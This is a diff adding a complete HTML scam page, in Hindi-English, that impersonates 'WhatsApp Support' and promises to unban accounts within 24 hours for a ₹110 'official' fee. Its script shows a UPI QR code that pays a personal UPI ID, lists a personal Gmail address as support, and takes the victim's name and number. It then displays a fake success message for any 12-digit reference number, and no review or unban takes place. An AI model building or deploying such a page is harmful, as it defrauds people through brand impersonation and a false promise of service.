@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WhatsApp Support - Account Review & Unban Portal</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #efeae2;
+      margin: 0;
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .card {
+      background: #ffffff;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+      width: 100%;
+      max-width: 400px;
+      border-top: 6px solid #00a884;
+    }
+    .whatsapp-logo {
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    .whatsapp-logo span {
+      background: #00a884;
+      color: white;
+      font-size: 30px;
+      padding: 10px 14px;
+      border-radius: 50%;
+    }
+    h2 { text-align: center; color: #111b21; margin-bottom: 5px; font-size: 20px; }
+    .subtitle { text-align: center; color: #02754d; font-size: 12px; font-weight: 600; margin-bottom: 20px; background: #e1f5fe; padding: 6px; border-radius: 4px;}
+    .form-group { margin-bottom: 15px; }
+    label { display: block; margin-bottom: 5px; font-weight: 600; color: #374151; font-size: 13px; }
+    input {
+      width: 100%;
+      padding: 11px;
+      border: 1px solid #d1d5db;
+      border-radius: 6px;
+      font-size: 14px;
+      box-sizing: border-box;
+      outline: none;
+    }
+    input:focus { border-color: #00a884; }
+    .price-box {
+      background: #f0fdf4;
+      border: 1px solid #bbf7d0;
+      padding: 10px;
+      border-radius: 6px;
+      text-align: center;
+      margin-bottom: 15px;
+      color: #166534;
+      font-weight: bold;
+      font-size: 14px;
+    }
+    .btn {
+      background: #00a884;
+      color: white;
+      border: none;
+      width: 100%;
+      padding: 12px;
+      font-size: 15px;
+      font-weight: bold;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 5px;
+      transition: background 0.2s;
+    }
+    .btn:hover { background: #019073; }
+    
+    /* Modal Styles */
+    .modal-overlay, .success-overlay {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0,0,0,0.6); display: none; justify-content: center; align-items: center; z-index: 10000;
+    }
+    .modal-content, .success-content {
+      background: white; padding: 20px; border-radius: 12px; width: 90%; max-width: 350px; text-align: center;
+    }
+    .support-email {
+      text-align: center;
+      margin-top: 15px;
+      font-size: 12px;
+      color: #667781;
+    }
+    .support-email a {
+      color: #00a884;
+      text-decoration: none;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="whatsapp-logo">
+      <span>💬</span>
+    </div>
+    <h2>WhatsApp Support</h2>
+    <p class="subtitle">100% Verified Request: 24 ghante ke andar WhatsApp unban ho jayega!</p>
+    
+    <div class="form-group">
+      <label>WhatsApp Profile Name</label>
+      <input type="text" id="accname" placeholder="Enter name on banned account">
+    </div>
+
+    <div class="form-group">
+      <label>Banned Mobile Number</label>
+      <input type="tel" id="mobileno" placeholder="Enter 10-digit mobile number" maxlength="10">
+    </div>
+
+    <div class="price-box">
+      Official Review & Unban Fee: ₹110
+    </div>
+
+    <button class="btn" onclick="initiatePayment()">Proceed to Secure Pay ₹110</button>
+
+    <div class="support-email">
+      Support Email: <a href="mailto:sumitawara580@gmail.com">sumitawara580@gmail.com</a>
+    </div>
+  </div>
+
+  <!-- Payment Modal -->
+  <div class="modal-overlay" id="payModal">
+    <div class="modal-content">
+      <h3 style="margin-top:0; color:#111b21; font-size:18px;">Scan & Pay ₹110</h3>
+      <p style="font-size: 11px; color: #667781; margin: 3px 0;">Merchant: <b>Amit Awara</b></p>
+      
+      <!-- QR Code Container -->
+      <div id="qrContainer" style="margin: 10px 0;"></div>
+
+      <p style="font-size: 12px; color: #4b5563;">Time Left: <span id="timer" style="font-weight:bold; color:#dc2626;">05:00</span></p>
+      
+      <div class="form-group" style="text-align: left; margin-top: 10px;">
+        <label style="font-size:12px;">Enter 12-Digit UTR / Reference Number</label>
+        <input type="text" id="utrInput" placeholder="e.g. 432109876543" maxlength="12">
+      </div>
+
+      <button class="btn" style="background:#059669;" onclick="confirmUnbanRequest()">Verify & Submit</button>
+      <button class="btn" style="background:#6b7280; margin-top:6px;" onclick="closeModal()">Cancel</button>
+    </div>
+  </div>
+
+  <!-- Success Overlay -->
+  <div class="success-overlay" id="successOverlay">
+    <div class="success-content">
+      <h3 style="color: #059669; margin-top:0;">✅ Request Submitted!</h3>
+      <div id="successDesc" style="font-size: 13px; color: #374151; text-align: left; background: #f0fdf4; padding: 10px; border-radius: 6px; margin: 10px 0; border: 1px solid #bbf7d0;"></div>
+      <button class="btn" onclick="location.reload()">Done</button>
+    </div>
+  </div>
+
+  <script>
+    const merchantUpiId = "amitawara764@okhdfcbank";
+    const merchantName = "Amit Awara";
+    const amount = 110;
+    let timerInterval;
+
+    function initiatePayment() {
+      let accName = document.getElementById('accname').value.trim();
+      let mobile = document.getElementById('mobileno').value.trim();
+
+      if(accName === "") {
+        alert("Kripya apne WhatsApp account ka naam darj karein!");
+        return;
+      }
+      if(mobile.length < 10) {
+        alert("Kripya valid 10-digit banned mobile number darj karein!");
+        return;
+      }
+
+      let upiUrl = `upi://pay?pa=${merchantUpiId}&pn=${encodeURIComponent(merchantName)}&am=${amount}.00&cu=INR`;
+      let qrContainer = document.getElementById('qrContainer');
+      qrContainer.innerHTML = `
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(upiUrl)}" alt="UPI QR Code" style="border-radius: 6px; border: 1px solid #ddd; display: block; margin: 0 auto;">
+        <p style="font-size: 11px; font-weight: bold; color: #374151; margin-top: 5px;">UPI ID: ${merchantUpiId}</p>
+      `;
+
+      document.getElementById('payModal').style.display = 'flex';
+      startTimer(300);
+    }
+
+    async function confirmUnbanRequest() {
+      let utr = document.getElementById('utrInput').value.trim();
+      let accName = document.getElementById('accname').value.trim();
+      let mobile = document.getElementById('mobileno').value.trim();
+
+      if(utr.length !== 12 || isNaN(utr)) {
+        alert("❌ Error: Kripya 12-digit ka valid numeric UTR / Reference number hi darj karein!");
+        return;
+      }
+
+      clearInterval(timerInterval);
+      closeModal();
+
+      let successBoxDesc = `
+        <b>Account Name:</b> ${accName}<br>
+        <b>Banned Mobile:</b> +91 ${mobile}<br>
+        <b>Fee Paid:</b> ₹110<br>
+        <b>UTR Ref:</b> ${utr}<br><br>
+        <span style="color: #059669; font-weight: bold;">✔ Review request successfully submit ho gayi hai! 24 hours ke andar account unban ho jayega.</span>
+      `;
+      
+      document.getElementById('successDesc').innerHTML = successBoxDesc;
+      document.getElementById('successOverlay').style.display = 'flex';
+    }
+
+    function closeModal() {
+      document.getElementById('payModal').style.display = 'none';
+      clearInterval(timerInterval);
+    }
+
+    function startTimer(duration) {
+      let timer = duration, minutes, seconds;
+      clearInterval(timerInterval);
+      timerInterval = setInterval(function () {
+        minutes = parseInt(timer / 60, 10);
+        seconds = parseInt(timer % 60, 10);
+        minutes = minutes < 10 ? "0" + minutes : minutes;
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+        document.getElementById('timer').textContent = minutes + ":" + seconds;
+        if (--timer < 0) {
+          clearInterval(timerInterval);
+          alert("Payment session timeout ho gaya!");
+          closeModal();
+        }
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
